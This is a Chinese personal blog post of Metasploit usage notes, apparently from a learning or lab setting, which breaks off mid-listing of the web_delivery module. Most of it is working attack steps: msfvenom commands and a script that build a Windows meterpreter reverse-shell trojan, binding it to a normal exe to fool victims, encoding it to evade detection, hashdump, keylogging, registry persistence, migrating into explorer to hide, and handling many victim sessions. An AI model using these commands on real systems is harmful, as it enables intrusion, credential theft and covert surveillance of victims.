@@ -1,0 +1,280 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Metasploit的使用笔记 | 月明星稀</title><meta name="author" content="lhl_2507"><meta name="copyright" content="lhl_2507"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Metasploit的使用笔记 Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。 Metasploit项目最为知名的子项目是开源的Metasploit框架，一套针对远程主机进行开发和执行“exploit代码”的工具。其他重要的子项目包括Opcode数据库、shellcode文件、安全研">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit的使用笔记">
+<meta property="og:url" content="https://lhl7.github.io/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="月明星稀">
+<meta property="og:description" content="Metasploit的使用笔记 Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。 Metasploit项目最为知名的子项目是开源的Metasploit框架，一套针对远程主机进行开发和执行“exploit代码”的工具。其他重要的子项目包括Opcode数据库、shellcode文件、安全研">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://lhl7.github.io/img/index.jpg">
+<meta property="article:published_time" content="2022-03-26T08:41:48.420Z">
+<meta property="article:modified_time" content="2022-03-26T08:39:46.186Z">
+<meta property="article:author" content="lhl_2507">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lhl7.github.io/img/index.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://lhl7.github.io/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Metasploit的使用笔记',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-26 16:39:46'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/index.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">月明星稀</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Metasploit的使用笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-03-26T08:41:48.420Z" title="Created 2022-03-26 16:41:48">2022-03-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-03-26T08:39:46.186Z" title="Updated 2022-03-26 16:39:46">2022-03-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/kali/">kali</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Metasploit的使用笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Metasploit的使用笔记"><a href="#Metasploit的使用笔记" class="headerlink" title="Metasploit的使用笔记"></a>Metasploit的使用笔记</h1><blockquote>
+<p><strong>Metasploit项目</strong>是一个旨在提供<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3">安全漏洞信息</a>计算机安全项目，可以协助安全工程师进行<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>（penetration testing）及<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F">入侵检测系统</a>签名开发。</p>
+<p>Metasploit项目最为知名的子项目是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81">开源</a>的Metasploit框架，一套针对远程主机进行开发和执行“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Exploit">exploit</a>代码”的工具。其他重要的子项目包括Opcode数据库、shellcode文件、安全研究等内容。</p>
+<p>Metasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。</p>
+</blockquote>
+<p>摘自：维基百科<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Metasploit">https://zh.wikipedia.org/wiki/Metasploit</a></p>
+<p>msf很像是python，它是有自己的命令执行窗口的，快速打开执行窗口（-q表示快速quick）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x01-木马文件的配置与生成"><a href="#0x01-木马文件的配置与生成" class="headerlink" title="0x01 木马文件的配置与生成"></a>0x01 木马文件的配置与生成</h2><p>此后的命令都是在<strong>msfconsole</strong>中输入的：</p>
+<h3 id="一、配置木马："><a href="#一、配置木马：" class="headerlink" title="一、配置木马："></a>一、配置木马：</h3><p>选择模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<p>输出当前选项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220321102830032.png" alt="image-20220321102830032"></p>
+<p>可以看到输出了我们使用的<strong>Module</strong>（现在还没选），同时还有<strong>payload options</strong>，其中显示的是监听主机的<strong>localhost</strong>和<strong>localport</strong>，此时，我们需要对其中的各个选项进行设置。</p>
+<p>设置主机<strong>LHOST</strong>（攻击者ip）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set LHOST 192.168.119.133</span><br></pre></td></tr></table></figure>
+
+<p>然后我们需要设置<strong>payload</strong>：</p>
+<p>我们可以先通过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure>
+
+<p>来展示所有payload，同时也可以随时使用tab键打印提示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220321104545327.png" alt="image-20220321104545327"></p>
+<p>设置<strong>payload</strong>使用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>至此，已经全部配置完毕。</p>
+<h3 id="二、生成木马："><a href="#二、生成木马：" class="headerlink" title="二、生成木马："></a>二、生成木马：</h3><p>打开新的命令窗口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows -o ./meter_re_tcp_x86.exe LOHOST=192.168.6.130 LPORT=4444</span><br></pre></td></tr></table></figure>
+
+<p>指定木马的内容，对应的文件格式，靶机的系统架构，还有我们监听者的IP和端口。</p>
+<h3 id="三、开启监听："><a href="#三、开启监听：" class="headerlink" title="三、开启监听："></a>三、开启监听：</h3><p>在刚刚配置木马的<strong>msfconsole</strong>中，输入<code>run</code>或者<code>exploit</code>:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220321110128592.png" alt="image-20220321110128592"></p>
+<p>第一次失败了，我们可以尝试换端口，然后就成功开启监听了。</p>
+<p>连接之后，可以通过**meterpreter&gt;**命令行控制。</p>
+<h3 id="四、通过文件快速启动："><a href="#四、通过文件快速启动：" class="headerlink" title="四、通过文件快速启动："></a>四、通过文件快速启动：</h3><p>由于每次过程比较复杂，所以我们可以使用shell脚本和文件msf自带的读取文件执行命令的方式，更快速的完成上面的步骤：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">x86_win.sh</span></span><br><span class="line">ip=192.168.6.130</span><br><span class="line">port=4444</span><br><span class="line">arch=x86</span><br><span class="line">platform=windows</span><br><span class="line">format=exe</span><br><span class="line">payload=windows/meterpreter/reverse_tcp</span><br><span class="line">out=../Backs/meter_re_tcp_x86.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p $payload -f $format -a $arch --platform $platform -o $out LHOST=$ip LPORT=$port</span><br></pre></td></tr></table></figure>
+
+<p>此文件用于生成木马文件，执行shell文件即可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.6.130</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>此文件用于快速开启监听，使用命令如下开启监听：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r ./run_x86_mete_re</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-捆绑、混淆"><a href="#0x02-捆绑、混淆" class="headerlink" title="0x02 捆绑、混淆"></a>0x02 捆绑、混淆</h2><p>注意，这里列举的是一部分msf的功能，但并非所有，可以通过：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-h</span> 对所有的功能参数进行查询，要对某条功能如encoder进行详细查看，使用：</span><br><span class="line">msfvenom <span class="literal">-l</span> encoder 当然，这里也可以替换为其他功能（也就是查看该功能的选项）</span><br></pre></td></tr></table></figure>
+
+<h3 id="一、捆绑"><a href="#一、捆绑" class="headerlink" title="一、捆绑"></a>一、捆绑</h3><p>捆绑指把木马捆绑在一个正常文件上，在执行正常文件的同时执行木马，迷惑受害者。</p>
+<p>捆绑使用参数<code>-x </code>，后面填所要捆绑的文件的地址即可。</p>
+<p>​    注意：这里可能会报由于没有Entery Point的错误，更换被绑定exe即可</p>
+<h3 id="二、混淆"><a href="#二、混淆" class="headerlink" title="二、混淆"></a>二、混淆</h3><p>混淆是指对木马代码进行处理，使其更难以被识别。</p>
+<p>混淆使用参数<code>-e &#39;混淆器名&#39;</code>（无引号），即encoder，-e后的参数可以通过命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-l</span> encoder</span><br></pre></td></tr></table></figure>
+
+<p>进行查询，常用的有：<code>x86/shikata_ga_nai</code></p>
+<p>​    </p>
+<p>添加参数<code>-i &#39;混淆次数&#39;</code>（无引号），作为混淆次数。</p>
+<h2 id="0x03-meterpreter"><a href="#0x03-meterpreter" class="headerlink" title="0x03 meterpreter"></a>0x03 meterpreter</h2><p>注：在下方列出了很多命令，我们要查询命令集，直接使用<code>?</code>进行查询。</p>
+<p>在木马连接了之后，我们使用<strong>meterpreter</strong>对受害靶机进行操作，那我们能够操作的内容有哪些呢？</p>
+<p><strong>getsystem</strong>命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem <span class="literal">-t0</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试所有可能的方法，获取更高权限（当然大概率是会失败的）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220325095245215.png" alt="image-20220325095245215"></p>
+<p>但是这里如果我们真的成功获得了权限，可以使用命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/hashdump</span><br></pre></td></tr></table></figure>
+
+<p>得到系统管理员密码的哈希，然后用其他方式进行爆破即可。</p>
+<h3 id="一、文件操作"><a href="#一、文件操作" class="headerlink" title="一、文件操作"></a>一、文件操作</h3><p>​    以下命令操作与linux类似，如不知道应该如何使用，可以直接在<strong>meterpreter</strong>命令行，输入该操作名，或者一般是操作名 <code>-h</code>就会出现相关帮助。</p>
+<p><strong>cat</strong>：Read the contents of a file to the screen<br><strong>cd</strong>：Change directory<br><strong>checksum</strong>：Retrieve the checksum of a file<br><strong>cp</strong>：Copy source to destination<br><strong>del</strong>：Delete the specified file<br><strong>dir</strong>：List files (alias for Is)<br><strong>download</strong>：Download a file or directory<br><strong>edit</strong>：Edit a file<br><strong>getlwd</strong>：Print local working directory<br><strong>getwd</strong>：Print working directory<br><strong>Icd</strong>：Change local working directory<br><strong>lls</strong>：List local files<br><strong>Ipwd</strong>：Print local working directory<br><strong>Is</strong>：List files<br><strong>mkdir</strong>：Make directory<br><strong>mv</strong>：Move source to destination<br><strong>pwd</strong>：Print working directory<br><strong>rm</strong>：Delete the specified file<br><strong>rmdir</strong>：Remove directory<br><strong>search</strong>：Search for files<br><strong>show_ mount</strong>： List all mount points/logical drlves<br><strong>upload</strong>：Upload a fle or directory</p>
+<h3 id="二、系统操作"><a href="#二、系统操作" class="headerlink" title="二、系统操作"></a>二、系统操作</h3><p><strong>clearev</strong>：Clear the event log<br><strong>drop_ token</strong>： Relinquishes any active impersonation token.<br><strong>execute</strong>：Execute a command<br><strong>getenv</strong>：Get one or more environment variable values<br><strong>getpid</strong>：Get the current process identifier<br><strong>getprivs</strong>：Attempt to enable all privileges available to the current process<br><strong>getsid</strong>：Get the SID of the user that the server is running as<br><strong>getuid</strong>：Get the user that the server is running as<br><strong>kill</strong>：Terminate a process<br><strong>localtime：</strong>Displays the target system local date and time<br><strong>pgrep</strong>：Filter processes by name<br><strong>pkill</strong>：Terminate processes by name<br><strong>ps</strong>：List running processes<br><strong>reboot：</strong>Reboots the remote computer<br><strong>reg</strong>：Modify and interact with the remote registry<br><strong>rev2self</strong>：Calls RevertToSelf() on the remote machine（降低权限）<br><strong>shell</strong>：Drop into a system command shell（进入反弹shell）<br><strong>shutdown</strong>：Shuts down the remote computer<br><strong>steal_ token</strong>： Attempts to steal an impersonation token from the target process<br><strong>suspend</strong>：Suspends(挂起) or resumes a list of processes<br><strong>sysinfo</strong>：Gets information about the remote system, such as OS</p>
+<h3 id="三、网络操作"><a href="#三、网络操作" class="headerlink" title="三、网络操作"></a>三、网络操作</h3><p><strong>arp</strong>：Display the host ARP cache<br><strong>getproxy</strong>：Display the current proxy configuration<br><strong>ifconfig</strong>：Display interfaces<br><strong>ipconfig</strong>：Display interfaces<br><strong>netstat：</strong>Display the network connections<br><strong>portfwd</strong>：Forward a local port to a remote service<br><strong>resolve：</strong>Resolve a set of host names on the target<br><strong>route</strong>：View and modify the routing table</p>
+<p>在这里，还需要提出一个重要的概念：</p>
+<h4 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a>端口转发：</h4><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220325104616631.png" alt="image-20220325104616631" style="zoom:67%;" />
+
+<p>我们在kali上的<strong>meterpreter</strong>中使用命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add <span class="literal">-l</span> <span class="number">6666</span> <span class="literal">-p</span> <span class="number">3389</span> <span class="literal">-r</span> <span class="number">192.168</span>.<span class="number">119.145</span></span><br></pre></td></tr></table></figure>
+
+<p>其中的参数分别为，本机开放的端口（6666），受害者开放的端口（3389），受害者的ip。</p>
+<p><em>其实我这里也没明白，受害者不是内网IP吗？</em></p>
+<h3 id="四、模拟用户操作"><a href="#四、模拟用户操作" class="headerlink" title="四、模拟用户操作"></a>四、模拟用户操作</h3><p><strong>enumdesktops</strong>： List all accessible desktops and window stations<br><strong>getdesktop</strong>：Get the current meterpreter desktop<br><strong>idletime</strong>：Returns the number of seconds the remote user has been idle<br><strong>keyboard_ send</strong>（模拟键盘输入）：Send keystrokes<br><strong>keyevent</strong>（模拟键盘事件）：Send key events<br><strong>keyscan_ start</strong>（开启键盘记录）：Start capturing keystrokes<br><strong>keyscan_ dump</strong>（输出到目前为止的键盘记录）：Dump the keystroke buffer<br><strong>keyscan_ stop</strong>（停止键盘记录）：Stop capturing keystrokes<br><strong>mouse</strong>（模拟鼠标事件）：Send mouse events<br><strong>screenshare</strong> ：Watch the remote user desktop in real time<br><strong>screenshot</strong>：Grab a screenshot of the interactive desktop<br><strong>setdesktop</strong>：Change the meterpreters current desktop<br><strong>uictl</strong>（夺取对方对于键盘和鼠标的控制权）：Control some of the user interface components</p>
+<h3 id="五、持久化、进程迁移"><a href="#五、持久化、进程迁移" class="headerlink" title="五、持久化、进程迁移"></a>五、持久化、进程迁移</h3><h4 id="持久化："><a href="#持久化：" class="headerlink" title="持久化："></a>持久化：</h4><p>​    持久化就是指目标主机在重启后依然自动进行连接，要做到这一点，我们需要执行在metepreter下通过<code>run</code>命令实现。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run persistence <span class="literal">-h</span> <span class="comment">#查看有关持久化的帮助</span></span><br><span class="line">run persistence <span class="literal">-x</span> <span class="literal">-i</span> <span class="number">3</span> <span class="literal">-p</span> <span class="string">&#x27;监听端口&#x27;</span> <span class="literal">-r</span> <span class="string">&#x27;监听ip&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>第二条命令开启了一个，开机启动（-x），每隔三秒尝试连接一次（-i 3）的持久化连接。</p>
+<p>具体实现是通过更改注册表实现的。</p>
+<h4 id="进程迁移："><a href="#进程迁移：" class="headerlink" title="进程迁移："></a>进程迁移：</h4><p>​    为什么要进行进程迁移呢？其一，我们的木马若是绑定在其他程序上的，其他程序关闭后，木马也被关闭，无法继续运行；其二，若我们的木马是一个单独的进程，容易被发现并且消灭，太过于明显。因此，我们使用进程迁移的方式，让我们的木马附着到其他看似无害的进程上，以达到隐藏的效果。</p>
+<p>​    要进行进程迁移，我们使用的是<code>migrate</code>命令。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metepreter&gt; migrate <span class="string">&#x27;pid&#x27;</span> <span class="comment">#迁移到pid进程下</span></span><br></pre></td></tr></table></figure>
+
+<p>注意别迁移到系统进程，容易造成崩溃，一般选择迁移到<strong>explorer</strong>进程中。</p>
+<h2 id="0x04-多个木马连接"><a href="#0x04-多个木马连接" class="headerlink" title="0x04 多个木马连接"></a>0x04 多个木马连接</h2><p>​    metesploit可以通过session来管理对某个木马进行连接的用户，即，当有多个用户对我们的同一个端口部署的同一个木马进行连接时，我们可以保存他们的状态，并使用session来管理他们。</p>
+<p>我们总结一下刚刚我们进行的步骤吧。</p>
+<ol>
+<li><code>msfconsole -q</code>打开msf6&gt;</li>
+<li><code>use exploit/multi/handler</code>选模块，变为<code>msf exploit(muti/handler)&gt;</code></li>
+<li>对所有参数进行配置，例如这里选择了meterpreter，</li>
+<li><code>run</code>或者<code>exploit</code>运行监听，打开了<code>meterpreter&gt;</code>专属的命令行</li>
+<li>然后我们按照0x03的各种操作进行操作即可。</li>
+</ol>
+<p>那么，我们在什么样的情况对sessions进行管理呢？</p>
+<p>​    当我们不想继续进行命令操作的时候，我们就可以<strong>使用命令<code>background</code>退回上一层</strong>，也就是回到<code>msf exploit(muti/handler)&gt;</code>中，进行配置，我们输入命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sessions <span class="comment">#查看现有的session情况</span></span><br><span class="line"><span class="built_in">set</span> exitonsession false <span class="comment">#表示设置允许多个session存在</span></span><br><span class="line">show advanced <span class="comment">#查看拓展设置，包括刚刚设置的内容</span></span><br><span class="line">run <span class="literal">-j</span> <span class="comment">#运行刚刚哪些配置的监听，在后台监听连接</span></span><br><span class="line">jobs <span class="comment">#查看我们在后台运行的所有任务</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就配置好了一个多任务的环境，此时通过<strong>sessions</strong>命令进行查看，若有多个人进行连接了，我们使用：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session <span class="literal">-i</span> <span class="string">&#x27;sessions序号&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>对他进行meterpreter操作，使用命令<strong>background</strong>或者其简写<strong>bg</strong>退出当前session，最后，我们还可以使用。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">job <span class="literal">-K</span> <span class="comment">#关掉所有正在后台运行的监听任务</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x05-其他模块"><a href="#0x05-其他模块" class="headerlink" title="0x05 其他模块"></a>0x05 其他模块</h2><h3 id="web-delivery："><a href="#web-delivery：" class="headerlink" title="web_delivery："></a>web_delivery：</h3><p>要在对方主机上进行攻击，我们能直接上传并执行我们的木马文件必然是极好的，但是若我们具有exp的权限，能否在仅仅执行一句话的情况下就直接获得metepreter的权限呢？</p>
+<p>我们可以使用模块：exploit/multi/script/<strong>web_delivery</strong>，使用</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf  &gt;  use exploit/multi/script/web_delivery</span><br><span class="line">msf  &gt;  show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/script/web_delivery):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  <span class="number">0.0</span>.<span class="number">0.0</span>          yes       The local host or network interface to listen on. This must be an address on the local machine or <span class="number">0.0</span>.<span class="number">0.0</span> to listen on all addresses.</span><br><span class="line">   SRVPORT  <span class="number">8080</span>             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL <span class="keyword">for</span> incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use <span class="keyword">for</span> this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (python/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span 